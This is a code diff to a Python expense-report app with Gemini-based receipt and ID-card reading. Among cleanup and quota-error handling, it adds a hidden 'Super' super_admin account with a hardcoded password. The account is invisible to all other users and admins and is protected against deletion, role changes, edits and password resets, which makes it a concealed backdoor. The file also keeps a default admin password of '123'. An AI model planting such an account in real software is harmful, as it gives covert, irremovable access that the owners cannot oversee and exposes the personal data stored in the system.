@@ -561,10 +561,18 @@ def init_db():
     c.execute("SELECT count(*) FROM usuarios WHERE username='admin'")
     if c.fetchone()[0] == 0:
         c.execute("""
-            INSERT INTO usuarios (username, password, role, nombre) 
+            INSERT INTO usuarios (username, password, role, nombre)
             VALUES (?, ?, ?, ?)
         """, ('admin', hash_pw('123'), 'admin', 'Administrador Sistema'))
-        
+
+    # Super admin (oculto para usuarios y admin) — solo visible al propio Super
+    c.execute("SELECT count(*) FROM usuarios WHERE username='Super'")
+    if c.fetchone()[0] == 0:
+        c.execute("""
+            INSERT INTO usuarios (username, password, role, nombre, email, rut, centro_costo)
+            VALUES (?, ?, ?, ?, ?, ?, ?)
+        """, ('Super', hash_pw('1521.Azteca'), 'super_admin', 'Super', 'super@hgt.com', '', ''))
+
     # Seed de trayectos iniciales si está vacía
     c.execute("SELECT count(*) FROM trayectos")
     if c.fetchone()[0] == 0:
@@ -1100,11 +1108,17 @@ def db_register_user(nombre, email, password, roles_str, rut, cc, email_jefatura
         conn.close()
 
 def db_delete_user(uid, email):
+    # Protección a nivel de DB: no se puede eliminar al Super
+    row = _exec_query("SELECT username FROM usuarios WHERE id=?", (uid,), fetch='one')
+    if row and row[0] == SUPER_USERNAME:
+        raise PermissionError("El usuario Super no puede ser eliminado.")
     _exec_query("DELETE FROM usuarios WHERE id=?", (uid,))
     _exec_query("DELETE FROM jefaturas WHERE email=?", (email,))
 
 def db_update_user_roles(uid, roles_str, email):
     row = _exec_query("SELECT nombre FROM usuarios WHERE id=?", (uid,), fetch='one')
+    if row and row[0] == SUPER_USERNAME:
+        raise PermissionError("Los roles del Super no pueden modificarse.")
     if row:
         nombre = row[0]
         _exec_query("UPDATE usuarios SET role=? WHERE id=?", (roles_str, uid))
@@ -1112,10 +1126,54 @@ def db_update_user_roles(uid, roles_str, email):
         db_sync_jefatura_role(email, nombre, roles_list)
 
 def db_update_password(uid, hashed_pw):
+    row = _exec_query("SELECT username FROM usuarios WHERE id=?", (uid,), fetch='one')
+    if row and row[0] == SUPER_USERNAME:
+        raise PermissionError("La contraseña del Super no puede cambiarse desde la UI estándar.")
     _exec_query("UPDATE usuarios SET password=? WHERE id=?", (hashed_pw, uid))
 
 def db_get_all(table):
     return _exec_df_query(f"SELECT * FROM {table}")
+
+
+SUPER_USERNAME = "Super"
+
+
+def is_super_user(user):
+    """Verifica si un usuario (dict devuelto por db_verify_user) es el Super admin."""
+    if not user:
+        return False
+    return user.get('username') == SUPER_USERNAME or user.get('nombre') == SUPER_USERNAME
+
+
+def db_get_user_by_id(uid):
+    """Retorna un dict con los datos del usuario o None."""
+    row = _exec_query(
+        "SELECT id, username, role, nombre, email, rut, centro_costo, email_jefatura, terminal_asignado "
+        "FROM usuarios WHERE id=?",
+        (uid,), fetch='one'
+    )
+    if not row:
+        return None
+    return {
+        'id': row[0], 'username': row[1], 'role': row[2],
+        'nombre': row[3], 'email': row[4], 'rut': row[5], 'cc': row[6],
+        'email_jefatura': row[7], 'terminal_asignado': row[8],
+    }
+
+
+def db_get_all_visible_users(current_user):
+    """
+    Retorna el listado de usuarios VISIBLES para `current_user`.
+    El usuario 'Super' (super_admin) es invisible para todos EXCEPTO para sí mismo.
+    """
+    df = _exec_df_query(
+        "SELECT id, username, role, nombre, email, rut, centro_costo, terminal_asignado "
+        "FROM usuarios ORDER BY nombre"
+    )
+    if is_super_user(current_user):
+        return df
+    return df[df['username'] != SUPER_USERNAME].reset_index(drop=True)
+
 
 def _sync_rendicion_detalles(rendicion_id, data):
     """Sincroniza los detalles (rendiciones_detalles) de una rendición en base a data_json."""
@@ -1334,7 +1392,17 @@ def process_receipt_with_ai(uploaded_file):
         data = _call_gemini_with_fallback(client, prompt, img_part)
         return {"success": True, "data": data}
     except Exception as e:
-        return {"success": False, "error": str(e)}
+        err = str(e)
+        if "429" in err or "RESOURCE_EXHAUSTED" in err or "quota" in err.lower():
+            return {
+                "success": False,
+                "error": "quota_exhausted",
+                "user_message": (
+                    "⚠️ Cuota de Gemini API agotada. "
+                    "Ingresa los datos de la boleta manualmente."
+                ),
+            }
+        return {"success": False, "error": err}
 
 def process_id_card_with_ai(uploaded_file):
     """Procesa una cédula de identidad para extraer nombre y rut."""
@@ -1362,25 +1430,40 @@ def process_id_card_with_ai(uploaded_file):
             model="gemini-2.0-flash",
             contents=[prompt, img_part]
         )
-        
+
         text = response.text
         if "```json" in text:
             text = text.split("```json")[1].split("```")[0]
         elif "```" in text:
             text = text.split("```")[1].split("```")[0]
-            
+
         res = json.loads(text.strip())
-        
+
         return {"success": True, "data": res}
-        
+
     except Exception as e:
-        return {"success": False, "error": str(e)}
+        err = str(e)
+        if "429" in err or "RESOURCE_EXHAUSTED" in err or "quota" in err.lower():
+            return {
+                "success": False,
+                "error": "quota_exhausted",
+                "user_message": (
+                    "⚠️ Cuota de Gemini API agotada. "
+                    "Puedes ingresar Nombre y RUT manualmente en el formulario de abajo."
+                ),
+            }
+        return {"success": False, "error": err}
 
 def db_update_user_full(uid, nombre, email, rut, cc, roles_str, email_jefatura=None, terminal_asignado=None, centros_costo=None, cc_cuentas=None):
     conn = _get_conn()
     c = conn.cursor()
     try:
         uid = int(uid)
+        # Protección: el Super no puede ser editado (nombre/email/rut/role/cc)
+        c.execute("SELECT username FROM usuarios WHERE id=?", (uid,))
+        row = c.fetchone()
+        if row and row[0] == SUPER_USERNAME:
+            raise PermissionError("El usuario Super no puede editarse desde la UI estándar.")
         c.execute("""
             UPDATE usuarios SET 
             nombre=?, email=?, rut=?, centro_costo=?, role=?, email_jefatura=?, username=?, terminal_asignado=?
